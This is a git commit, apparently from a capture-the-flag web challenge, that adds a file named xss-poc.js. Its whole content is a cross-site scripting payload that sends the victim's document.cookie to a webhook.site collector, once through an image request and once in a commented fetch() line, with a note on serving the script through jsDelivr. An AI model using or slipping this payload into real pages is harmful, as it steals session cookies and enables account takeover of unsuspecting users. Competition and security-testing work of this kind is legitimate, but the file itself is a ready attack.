6a453ecc812985aa907139abc8773dc7ba37286d
lars mueller <muellerl@mgp.net>
2022-12-25 15:52:02 +0100

    initial commit

---
+++ web_cursed_party/xss-poc.js
@@ -0,0 +1,6 @@
+// https://app.interactsh.com/#/
+// https://webhook.site/#!/ab5272cf-a7f6-46af-ae5e-ea1888aeade2/8cb5a993-c0a8-4155-9307-b3956cd153c9/1
+// fetch ("https://webhook.site/ab5272cf-a7f6-46af-ae5e-ea1888aeade2/?cookie" + document.cookie);
+// convert link via: https://www.jsdelivr.com/github
+
+var i=new Image;i.src="https://webhook.site/ab5272cf-a7f6-46af-ae5e-ea1888aeade2/?cookie="+document.cookie;
